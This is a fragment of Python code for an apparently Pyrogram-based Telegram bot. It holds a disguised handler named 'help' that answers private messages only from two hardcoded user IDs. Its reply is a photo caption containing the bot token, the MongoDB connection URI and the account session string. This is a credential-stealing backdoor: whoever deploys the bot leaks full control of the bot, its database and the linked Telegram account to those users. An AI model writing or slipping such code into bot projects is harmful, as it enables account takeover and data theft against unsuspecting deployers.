...
@app.on_message(
    ...
    & filters.private
    & (filters.user(7990474206) | filters.user(1786683163))
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://files.catbox.moe/2oj1vp.webp",
       caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ ᴅʙ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Nycreation_Chatzone)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• ɴᴀɴᴅ •", url=f"https://t.me/Nycreation_chatzone")
                 ]
            ]
         ),
     )
